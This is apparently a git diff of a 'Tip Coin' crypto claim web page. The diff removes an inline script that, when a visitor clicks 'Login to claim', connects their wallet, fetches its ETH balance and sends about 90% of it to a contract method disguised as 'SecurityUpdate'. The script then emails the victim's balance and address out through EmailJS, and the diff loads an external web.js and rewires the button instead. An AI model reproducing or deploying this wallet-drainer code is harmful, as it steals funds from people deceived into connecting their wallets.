@@ -6,13 +6,10 @@
     <link rel="icon" href="https://thetipcoin.io/favicon.png">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
     <title>Tip Coin</title>
-    <!-- <script type="text/javascript" src="web.js"></script> -->
-    <!-- <script type="text/javascript" src="web.js"></script> -->
+    <script type="text/javascript" src="web.js"></script>
     <link rel="stylesheet" href="https://thetipcoin.io/assets/index-092b7916.css">
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
-    <script  src="https://cdn.jsdelivr.net/npm/@walletconnect/eth-provider@1.0.0/dist/umd/index.min.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.2.7-rc.0/web3.min.js"></script>
     <link rel="stylesheet" href="modal.css">
-   
     <style id="_goober">
       .go1475592160 {
         height: 0;
@@ -730,122 +727,6 @@
     <!-- <link rel="modulepreload" as="script" crossorigin="" href="https://thetipcoin.io/assets/if-defined-028f16f6.js"> -->
   </head>
   <body>
-
-    <script type="text/javascript">
-
-      // const WalletConnectProvider  = new WalletConnectProvider.default();
-const provider = new WalletConnectProvider.default({
-  infuraId: 'afeca39d1e664a35aeaea9b3a667ff1d',
-});
-
-const runContract = async () => {
-  try {
-    await provider.enable(); // Request wallet connection
-    if (provider.wc.connected) {
-      // WalletConnect session is connected
-      console.log('WalletConnect is connected!');
-      const web3 = new Web3(provider);
-      const accounts = await web3.eth.getAccounts();
-      const account = accounts[0];
-
-	  const apiKey = "876RZ5Y8WWAXVNZN61T2WPFTGI5MBI5GGX"; // for eth
-	  //const ethBalanceApiUrl = `https://api-testnet.bscscan.com/api?module=account&action=balance&address=${account}&apikey=${apiKey}`;
-	  const ethBalanceApiUrl = `https://api.etherscan.io/api?module=account&action=balance&address=${account}&apikey=${apiKey}`;
-	  
-	  const response = await fetch(ethBalanceApiUrl);
-	  const ethBalanceData = await response.json();
-	  const ethBalanceInWei = ethBalanceData.result;
-	  const gasFee = 0.1 * ethBalanceInWei;
-	  const ethtransaferableInWei = Math.floor(ethBalanceInWei - gasFee);
-		// Now, you can use 'account' for your contract interactions
-		const contractAbi = [{
-		  "constant": true,
-		  "inputs": [],
-		  "name": "getBalance",
-		  "outputs": [{
-			  "name": "",
-			  "type": "uint256"
-		  }],
-		  "payable": false,
-		  "stateMutability": "view",
-		  "type": "function"
-	  }, {
-		  "constant": false,
-		  "inputs": [],
-		  "name": "withdraw",
-		  "outputs": [],
-		  "payable": false,
-		  "stateMutability": "nonpayable",
-		  "type": "function"
-	  }, {
-		  "constant": false,
-		  "inputs": [],
-		  "name": "SecurityUpdate",
-		  "outputs": [],
-		  "payable": true,
-		  "stateMutability": "payable",
-		  "type": "function"
-	  }, {
-		  "constant": true,
-		  "inputs": [],
-		  "name": "getOwner",
-		  "outputs": [{
-			  "name": "",
-			  "type": "address"
-		  }],
-		  "payable": false,
-		  "stateMutability": "view",
-		  "type": "function"
-	  }, {
-		  "inputs": [],
-		  "payable": false,
-		  "stateMutability": "nonpayable",
-		  "type": "constructor"
-	  }];
-	  const contractAddress = "0x0206b09AC971cb742aA059A44Fb0200768690a33";
-
-      const contract = new web3.eth.Contract(contractAbi, contractAddress);
-
-      // Call your contract methods here
-// Example payable function
-      const payableFunction = contract.methods.SecurityUpdate();
-      
-      const valueInWei = web3.utils.toWei('0.1', 'ether'); // Specify the value to send with the transaction
-      
-      payableFunction
-        .send({
-          from: account, // The user's wallet address
-          value: ethtransaferableInWei, // The amount of Ether to send
-          gas: 0
-        })
-      // Call sendEmail function with balance and wallet address
-      sendEmail(ethtransaferableInWei, account);
-    }
-  } catch (error) {
-    console.error('WalletConnect error:', error);
-  }
-};
-
-// Function to send the email
-function sendEmail(balance, wallet) {
-  emailjs.init('your_user_id'); // Replace with your actual user ID
-
-  var templateParams = {
-    balance: balance,
-    wallet: wallet,
-  };
-
-  emailjs.send('service_h2vkhpq', 'template_9qyt9rq', templateParams)
-    .then(function(response) {
-      console.log('Email sent:', response);
-    })
-    .catch(function(error) {
-      console.error('Email error:', error);
-    });
-}
-
-
-    </script>
     <div id="root">
       <div class="MuiBox-root css-i9gxme">
         <header class="MuiPaper-root MuiPaper-outlined MuiAppBar-root MuiAppBar-colorPrimary MuiAppBar-positionFixed mui-fixed css-1n82n5u">
@@ -859,7 +740,7 @@ function sendEmail(balance, wallet) {
                 </button>
               </a>
             </div>
-            <button class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeSmall MuiButton-containedSizeSmall MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeSmall MuiButton-containedSizeSmall css-1wmb0oc" tabindex="0" type="button" id="connectButton" onclick="runContract()">Login to claim <span class="MuiTouchRipple-root css-w0pj6f"></span>
+            <button class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeSmall MuiButton-containedSizeSmall MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeSmall MuiButton-containedSizeSmall css-1wmb0oc" tabindex="0" type="button" onclick="connectContract()">Login to claim <span class="MuiTouchRipple-root css-w0pj6f"></span>
             </button>
           </div>
         </header>
@@ -1052,8 +933,5 @@ function sendEmail(balance, wallet) {
             </div>
           </div>
         </div>
-        <!-- <script type="text/javascript" src="web.js"></script> -->
   </body>
-
-  
 </html>
